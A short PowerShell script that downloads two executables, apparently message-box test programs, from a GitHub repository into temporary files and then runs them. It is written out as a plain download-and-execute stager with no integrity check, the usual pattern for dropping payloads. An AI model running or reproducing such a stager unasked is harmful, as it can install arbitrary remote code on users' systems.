# URLs of the executable files
$U1 = 'https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.exe'
$U2 = 'https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.exe'

# Create temporary files to store the downloaded EXEs
$TempFile1 = [System.IO.Path]::GetTempFileName()
$TempFile2 = [System.IO.Path]::GetTempFileName()

# Download the EXEs from GitHub into temporary files
Invoke-WebRequest -Uri $U1 -OutFile $TempFile1
Invoke-WebRequest -Uri $U2 -OutFile $TempFile2

# Run the downloaded EXEs
Start-Process -FilePath $TempFile1 -Wait
Start-Process -FilePath $TempFile2 -Wait
